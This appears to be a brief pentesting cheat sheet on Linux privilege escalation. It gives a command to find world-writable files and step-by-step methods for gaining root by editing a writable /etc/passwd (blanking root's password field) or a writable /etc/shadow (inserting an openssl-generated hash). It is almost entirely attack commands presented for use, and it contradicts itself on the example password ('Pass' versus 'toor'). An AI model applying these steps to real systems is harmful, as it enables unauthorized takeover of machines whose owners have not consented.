
# Find World-Writable Files
```bash
find / -not -type l -perm -o+w 2>/dev/null
```


## /etc/passwd

If we have write permission of /etc/passwd by some means, we can modify this file as desired for us. First check the content of that file with cat /etc/passwd.
```bash
root:x:0:0:root:/root:/bin/sh
```
By removing this x character in the root line, we can become root without password. Below
```bash
root::0:0:root:/root:/bin/sh
```

## /etc/shadow

If we have write permission of /etc/shadow by some means, we can modify the password for each user.
First of all, create a new password using openssl.

generate a new password (e.g., `Pass`) and run:

```bash
openssl passwd -1 -salt xyz toor
```

You'll get something like:

```bash
$1$xyz$uG83nNwhV1Elk8sfZSSr8.
```

Open `/etc/shadow`, find the line that starts with `root:`, and replace the old hash with your new one. and now you can paste the new generated hash, saved the file and access the root user using the new password
